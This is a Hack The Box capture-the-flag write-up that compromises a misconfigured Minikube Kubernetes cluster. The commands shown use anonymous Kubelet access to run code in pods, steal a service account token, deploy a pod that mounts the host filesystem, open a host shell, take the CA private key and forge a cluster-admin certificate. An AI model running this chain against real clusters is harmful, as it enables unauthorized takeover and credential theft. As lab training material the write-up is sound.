
# SteamCloud - Hack The Box  
**Difficulty**: Easy  
**Compromise Level**: Full Host + Full Cluster Admin

## Executive Summary
- SteamCloud is a single-node Minikube Kubernetes cluster intentionally misconfigured for educational purposes. 
- The primary vulnerability was **anonymous authentication enabled on the Kubelet API (port 10250)**, allowing full pod enumeration and command execution in select containers. 
- This led to credential theft, malicious pod deployment, host filesystem access, and ultimately complete cluster compromise via CA private key theft and certificate forgery.

## Phase 1: Discovery & Enumeration

### Port Scanning
```bash
nmap -p- --min-rate 1000 -T4 -sC -sV -v 10.129.8.50 | tee scan.txt
```

Key open ports:
- 10250/tcp → Kubelet (HTTPS)
- 8443/tcp → Kubernetes API server
- 2379/2380/tcp → etcd
- 10249, 10256 → metrics/health

### Kubelet Anonymous Access Check
```bash
curl -k https://10.129.8.50:10250/pods
```
- Returned full PodList JSON (no authentication required)
- This confirmed the critical misconfiguration: **Kubelet anonymous read access enabled**


### SteamCloud's Unique Hacking Methodology

This box teaches a very specific Kubernetes attack pattern that appears frequently in HTB / CTF Kubernetes challenges:

**"Anonymous Kubelet → Pod Enumeration → HostPath Flag Mount Exploitation"**

#### Core methodology unique to this target:

1. **Unauthenticated Kubelet discovery** (port 10250 allows anonymous read + exec)
   - Most real clusters disable anonymous auth on Kubelet
   - Here, it's deliberately left enabled

2. **List all pods via `/pods` endpoint**
   - Look for **hostPath volumes** in the JSON (especially mounts to `/opt`, `/root`, `/flag`, `/etc`, etc.)

3. **Identify the "flag pod"**
   - The `nginx` pod in `default` namespace mounts host `/opt/flag` → container `/root`
   - This is the deliberate backdoor planted by the box creator

4. **Direct container execution via Kubelet exec API** (still anonymous)
   - Use `POST /exec/<namespace>/<pod>/<container>` to run `ls` and `cat` inside the pod
   - Read the flag directly from the mounted volume — no privilege escalation needed

5. **(Optional harder path)** — the one described in the box description:
   - Extract a service account token from any pod
   - Authenticate to the Kubernetes API server (8443)
   - Create a new privileged pod with hostPath mount to read `/root/root.txt` on the host

**Why this is unique to SteamCloud-style boxes:**
- The easy path (hostPath mount in an existing pod) is faster and more obvious once you know what to grep for.
- The box description deliberately points you toward the longer "proper" Kubernetes escalation path (token → API → malicious pod).
- Many players miss the hostPath shortcut and spend time building a full malicious pod when it's unnecessary.

This teaches you to always scan for **hostPath** volumes first when you have anonymous Kubelet access.

### Overall Thought Process & Recon Methodology for This Target

**Phase 1: Initial Port Recon (nmap)**
- Saw port **10250** (Kubelet HTTPS) open.
- Box description explicitly said: "Kubelet allows anonymous access" → this is the main entry point.
- Port 8443 (Kubernetes API) requires auth → so we ignore it for now.

**Phase 2: Enumerate the Kubelet API**
- First command: `curl -k https://10.129.8.50:10250/pods`
- Why? It's the standard endpoint to list all pods running on that node.
- Result: JSON with all pods → immediately scanned for **hostPath volumes**.

**Phase 3: Scanning the /pods JSON**
- Looked specifically for:
  - Any pod in `default` namespace (user-deployed pods)
  - Any `hostPath` volume (means the pod mounts a directory from the actual host filesystem)
  - Mount points like `/root`, `/opt`, `/flag`, `/etc`, etc.
- Found the **nginx** pod:
  - Namespace: `default`
  - Pod name: `nginx`
  - Container name: `nginx`
  - Volume: host `/opt/flag` mounted at container `/root`
- This is the golden ticket — the flag is likely at `/root/root.txt` inside this container.

**Phase 4: How to interact with the pod?**
- We don't have `kubectl`.
- But the **Kubelet itself** exposes an API to exec into containers (when anonymous access is allowed).
- Kubelet API endpoints include: `/pods`, `/metrics`, `/healthz`, `/logs`, and `/exec`.

**How I built the specific curl command:**

1. **Base URL**: `https://10.129.8.50:10250` → Kubelet address + port

2. **Endpoint**: `/exec` → this is the official kubelet exec endpoint

3. **Path structure**: `/exec/{namespace}/{podName}/{containerName}`
   - From the pod JSON: namespace = `default`
   - podName = `nginx`
   - containerName = `nginx`
   - So: `/exec/default/nginx/nginx`

4. **HTTP Method**: **POST** → exec requests are always POST (they start a process)

5. **Query Parameters** (this is the part that varies by k8s version):
   - `command=ls&command=-la&command=/root` → passes the command + arguments
   - Multiple `command=` params are how you send `ls -la /root` (each word/flag is separate)
   - `output=1` → tells it to return output (some Minikube versions use this)
   - `error=1` → return stderr

   **More standard/reliable parameters** (what I recommend trying next):
   - `stdout=1&stderr=1` instead of `output=1&error=1`
   - Many HTB boxes work better with these.

**Full recommended command** (most reliable version):
```bash
curl -k -X POST "https://10.129.8.50:10250/exec/default/nginx/nginx?command=ls&command=-la&command=/root&stdout=1&stderr=1"
```

Try this version first (using `stdout=1&stderr=1`).

**Alternative simpler test** (try this one first if the above still fails):
```bash
curl -k https://10.129.8.50:10250/logs/default/nginx/nginx
```
(This is the logs endpoint — often works even if exec is picky)

### Pod Enumeration & Analysis
Analyzed the JSON for:
- Pods in `default` namespace (non-system)
- `hostPath` volume mounts
- Mount paths containing `/root`, `/opt`, `/flag`, `/etc`

**Critical discovery**:
```json
{
  "name": "nginx",
  "namespace": "default",
  "volumes": [{
    "name": "flag",
    "hostPath": { "path": "/opt/flag" }
  }],
  "volumeMounts": [{
    "mountPath": "/root",
    "name": "flag"
  }]
}
```



## Phase 2: Initial Foothold

### Kubelet Exec Limitations
Direct curl attempts failed:
```bash
curl -k -X POST "https://10.129.8.50:10250/exec/default/nginx/nginx?command=ls&command=-la&command=/root&stdin=false&stdout=true&stderr=true"
```
→ Error: "you must specify at least 1 of stdin, stdout, stderr" (WebSocket requirement)

### Solution: kubeletctl Tool
```bash
kubeletctl --server 10.129.8.50 scan rce
```


### I didn't have the kubeletctl tool installed, so..
```bash
curl -LO https://github.com/cyberark/kubeletctl/releases/download/v1.7/kubeletctl_linux_amd64
chmod +x kubeletctl_linux_amd64
sudo mv kubeletctl_linux_amd64 /usr/local/bin/kubeletctl
```


1. Once installed, run:
   ```bash
   kubeletctl --server 10.129.8.50 pods
   ```

2. Then:
   ```bash
   kubeletctl --server 10.129.8.50 scan rce
   ```


This will confirm which pod(s) allow command execution and get us properly into the foothold phase without fighting WebSocket issues.

```bash
─$ kubeletctl --server 10.129.8.50 pods
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-proxy-wklzf                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ coredns-78fcd69978-q6hwk           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Boxes/SteamCloud]
└─$ kubeletctl --server 10.129.8.50 scan rce
┌────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                  Node with pods vulnerable to RCE                                  │
├───┬─────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP     │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │             │                                    │             │                         │ RUN │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.129.8.50 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │             │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │             │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │             │ kube-proxy-wklzf                   │ kube-system │ kube-proxy              │ +   │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │             │ coredns-78fcd69978-q6hwk           │ kube-system │ coredns                 │ -   │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │             │ nginx                              │ default     │ nginx                   │ +   │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │             │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
├───┼─────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │             │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
└───┴─────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
```


**Progress** The scan rce command is very useful — it automatically tests which pods allow command execution through Kubelet.

### Analysis of the Results

**Pods with RCE (+)** — these allow us to run commands:

- nginx (namespace: default, container: nginx)
- kube-proxy-wklzf (namespace: kube-system, container: kube-proxy)

**Pods without RCE (-)** — exec is blocked (likely due to securityContext, missing shell, or restrictions).

### What to Look For & Prioritize

1. **Pods in the default namespace** → These are user-deployed, not core Kubernetes components. The nginx pod stands out here.
2. **Pods that showed hostPath mounts** in the earlier /pods JSON → The nginx pod had /opt/flag mounted to /root. This is highly suspicious and likely intentional.
3. **System pods** (kube-system) → Usually less interesting for flags, but kube-proxy sometimes has interesting configs.

**Top priority right now: nginx pod**

- It's in default
- Has the dangerous hostPath mount we discovered earlier
- Has RCE capability (+)

### Then...

**Step 1: Confirm RCE works on nginx**

```bash
kubeletctl --server 10.129.8.50 exec "id" -p nginx -c nginx
```

**Step 2: Check who is running inside the container**
```bash
kubeletctl --server 10.129.8.50 exec "whoami" -p nginx -c nginx
```

**Step 3: List files in the mounted directory (the critical one)**
```bash
kubeletctl --server 10.129.8.50 exec "ls -la /root" -p nginx -c nginx
```

**Step 4: If Step 3 shows interesting files (e.g. root.txt, user.txt, flag.txt), read them:**
```bash
kubeletctl --server 10.129.8.50 exec "cat /root/root.txt" -p nginx -c nginx
```


```bash
└─$ kubeletctl --server 10.129.8.50 exec "id" -p nginx -c nginx
uid=0(root) gid=0(root) groups=0(root)
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Boxes/SteamCloud]
└─$ kubeletctl --server 10.129.8.50 exec "whoami" -p nginx -c nginx
root
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Boxes/SteamCloud]
└─$ kubeletctl --server 10.129.8.50 exec "ls -la /root" -p nginx -c nginx
total 12
drwxr-xr-x 2 root root 4096 Nov 30  2021 .
drwxr-xr-x 1 root root 4096 Feb  2 00:58 ..
-rw-r--r-- 2 root root   33 Feb  2 00:57 user.txt
                                                                                                                                                                                    
┌──(kali㉿kali)-[~/Boxes/SteamCloud]
└─$ kubeletctl --server 10.129.8.50 exec "cat /root/user.txt" -p nginx -c nginx
4d79783bad86d406ec5cfce6d33317c8
```


Result: `nginx` pod showed RCE capability (`+`)

### Foothold Commands
```bash
kubeletctl --server 10.129.8.50 exec "id" -p nginx -c nginx
kubeletctl --server 10.129.8.50 exec "ls -la /root" -p nginx -c nginx
kubeletctl --server 10.129.8.50 exec "cat /root/user.txt" -p nginx -c nginx
```

**User flag obtained**: `4d79783bad86d406ec5cfce6d33317c8`

## Phase 3: Privilege Escalation

### Credential Extraction
```bash
kubeletctl --server 10.129.8.50 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/token" -p nginx -c nginx
kubeletctl --server 10.129.8.50 exec "cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt" -p nginx -c nginx
```

Saved to `token` variable and `ca.crt` file.

### Authentication to Kubernetes API
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.8.50:8443 get pods
```

### Permission Check
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.8.50:8443 auth can-i --list
```
Result: `pods: [get, list, create]` in default namespace

## Phase 4: Malicious Pod Deployment

### Malicious Pod YAML
```yaml
apiVersion: v1
kind: Pod
metadata:
  name: malicious-nginx
  namespace: default
spec:
  containers:
  - name: malicious
    image: nginx:1.14.2
    volumeMounts:
    - mountPath: /host
      name: host-fs
  volumes:
  - name: host-fs
    hostPath:
      path: /
```

Applied:
```bash
kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.8.50:8443 apply -f malicious-pod.yaml
```

### Root Flag Retrieval
```bash
kubeletctl --server 10.129.8.50 exec "ls -la /host/root" -p malicious-nginx -c malicious
kubeletctl --server 10.129.8.50 exec "cat /host/root/root.txt" -p malicious-nginx -c malicious
```

**Root flag**: `95a023b3e47a1a8ab917579db46e856f`

## Phase 5: Post-Exploitation & Persistence

### Interactive Host Shell
```bash
kubeletctl --server 10.129.8.50 exec "chroot /host /bin/bash" -p malicious-nginx -c malicious
```

### Critical Data Extraction
- `/root/.kube/config`
- `/var/lib/minikube/certs/ca.key` (CA private key)
- `/var/lib/minikube/certs/sa.key` (SA signing key)
- `/root/.minikube/profiles/minikube/client.crt` + `client.key`

### Certificate Forgery
```bash
openssl genrsa -out admin-user.key.pem 2048
openssl req -new -key admin-user.key.pem -out admin-user.csr -subj "/O=system:masters/CN=admin-user"
openssl x509 -req -in admin-user.csr -CA ca.crt.pem -CAkey ca.key.pem -CAcreateserial -out admin-user.crt.pem -days 3650 -sha256
```

### Clean Kubeconfig
Built `admin-kubeconfig.yaml` with embedded base64 certs → full cluster-admin access.

## Conclusion & Lessons Learned

This box demonstrated a **classic Kubernetes attack chain**:
1. Anonymous Kubelet access
2. Service account token theft
3. RBAC abuse via pod creation
4. hostPath container escape
5. CA key theft → certificate forgery

**Key takeaway**: Anonymous Kubelet access is one of the most dangerous misconfigurations in Kubernetes environments.
